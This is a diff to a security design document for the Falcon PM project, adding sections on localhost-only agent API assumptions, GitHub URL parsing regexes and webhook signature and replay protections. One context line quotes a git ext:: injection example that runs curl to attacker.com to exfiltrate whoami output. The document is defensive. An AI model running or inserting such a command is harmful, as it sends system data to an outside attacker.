@@ -95,6 +95,18 @@ This check is performed in the agent router middleware and applies to all `/api/
 
 **Note on Phase 5 Implementation:** The current implementation validates agent-project association but does not enforce agent `status === 'working'` checks. Phase 5 will add full status validation to ensure agents can only access issues when actively assigned to work on them.
 
+### Network Boundary
+
+The agent API (`/api/agent/*`) is designed for **internal use only**. Agents run as local subprocesses on the same machine as the Falcon PM server and communicate over localhost.
+
+**Security assumption:** The agent API does NOT implement authentication beyond the X-Agent-ID header check. This is acceptable because:
+
+1. The server binds to localhost only (127.0.0.1)
+2. Agents are spawned by the orchestrator, not external clients
+3. Multi-tenancy is not a design goal for local development
+
+**Production consideration:** If the agent API is ever exposed beyond localhost (e.g., for remote agent execution), additional authentication (JWT, mTLS) would be required. The current X-Agent-ID header provides identification, not authentication.
+
 ## GitHub Token Management
 
 ### Storage
@@ -714,6 +726,29 @@ The `ext::` protocol is particularly dangerous as it can execute arbitrary shell
 ext::sh -c 'curl attacker.com/exfil?$(whoami)'% >&2
 ```
 
+### GitHub URL Parsing (parseRepoUrl)
+
+The `parseRepoUrl()` function in `src/pm/github/repo.ts` parses GitHub repository URLs to extract owner and repo name. It supports three formats:
+
+| Format | Example | Regex |
+|--------|---------|-------|
+| HTTPS | `https://github.com/owner/repo` | `^https?://github\.com/([^/]+)/([^/]+)` |
+| SSH | `git@github.com:owner/repo` | `^git@github\.com:([^/]+)/([^/]+)` |
+| Short | `owner/repo` | `^([^/:]+)/([^/]+)$` |
+
+**Security Constraint:** The short format regex `^([^/:]+)/([^/]+)$` explicitly rejects owner names containing `:` or `/`. This prevents:
+
+1. **SSH URL misparse:** Input like `git@github.com:owner/repo` being incorrectly treated as short format with owner = `git@github.com`
+2. **Protocol injection:** Crafted inputs that could be parsed ambiguously
+
+```typescript
+// Short format - reject if owner contains ':'
+const shortMatch = url.match(/^([^/:]+)\/([^/]+)$/);
+// The [^/:] character class ensures ':' is not in the owner
+```
+
+This validation is security-relevant and MUST be preserved in any reimplementation.
+
 ### Flag Injection Protection
 
 The `commitAndPushAgentWork()` function validates the `files` array to prevent command-line flag injection:
@@ -801,6 +836,63 @@ The `isSafeRelativePath()` function in `src/pm/api/validation.ts` validates path
 **Rationale:** User input may originate from different platforms (clipboard paste, API calls). Validating only for the host OS would allow Windows-style paths to bypass checks on Unix servers.
 
 **Do not remove** Windows path checks even if the server only runs on Unix.
+
+## GitHub Webhook Security
+
+### Signature Verification
+
+GitHub webhook requests are authenticated using HMAC-SHA256 signatures. The webhook handler verifies the `x-hub-signature-256` header against the payload using a shared secret. The signature comparison uses `crypto.timingSafeEqual()` to prevent timing attacks.
+
+**Configuration:**
+
+1. `webhookSecret` option passed to `createGitHubWebhookRouter()`
+2. `GITHUB_WEBHOOK_SECRET` environment variable (fallback)
+
+**Security requirement:** By default, webhook signature verification is **required**. If neither the option nor environment variable is set, webhooks are rejected with a validation error. This prevents accepting forged webhook payloads from attackers.
+
+To disable signature verification for local development (NOT recommended for production):
+
+```typescript
+createGitHubWebhookRouter({
+  repos,
+  requireSecret: false,  // Only for local development
+});
+```
+
+### Replay Attack Prevention
+
+The webhook handler tracks delivery IDs to prevent replay attacks:
+
+- Delivery IDs are cached for **5 minutes** (TTL)
+- Duplicate deliveries are detected and silently acknowledged (`200 OK` with `{ ok: true }`)
+- No processing occurs for duplicate deliveries
+- Cache is capped at **10,000 entries** to prevent memory exhaustion during DoS attacks
+
+**Design decision:** We return success for duplicates rather than an error to prevent GitHub from retrying. From GitHub's perspective, the delivery was "successful" (acknowledged), even though we didn't process it again.
+
+**LRU eviction:** When the cache reaches its 10,000 entry limit, it evicts the oldest 10% of entries (1,000 entries) in a single batch. This amortizes eviction overhead while keeping memory bounded. The alternative of evicting one entry at a time would cause lock contention under high load.
+
+**Limitation:** The replay cache is in-memory only and is lost on server restart. For production deployments with high availability requirements, consider implementing persistent delivery tracking.
+
+### Supported Webhook Events
+
+Currently, only `pull_request` events are processed. All other event types (`push`, `check_run`, `issue_comment`, etc.) return `200 OK` without processing.
+
+**Future enhancement:** Add support for `check_run` (CI status updates) and `issue_comment` (bot command parsing).
+
+### Middleware Ordering Constraint
+
+**CRITICAL:** The GitHub webhook route **MUST** be registered **BEFORE** the global `express.json()` middleware.
+
+The webhook router uses a custom JSON parser with a `verify` callback that captures the raw request body (`req.rawBody`). This raw body is required for HMAC-SHA256 signature verification. If the global JSON parser runs first, it consumes the body stream and the raw bytes are lost.
+
+```typescript
+// CORRECT order in server.ts:
+app.use('/api/github/webhook', createGitHubWebhookRouter(...));  // Has its own JSON parser
+app.use(express.json({ limit: '100kb' }));                       // Global parser AFTER
+```
+
+**Consequence of violation:** Signature verification will fail for all webhook requests, breaking GitHub integration and potentially exposing the system to forged webhook attacks.
 
 ## Worktree Existence Checks
 
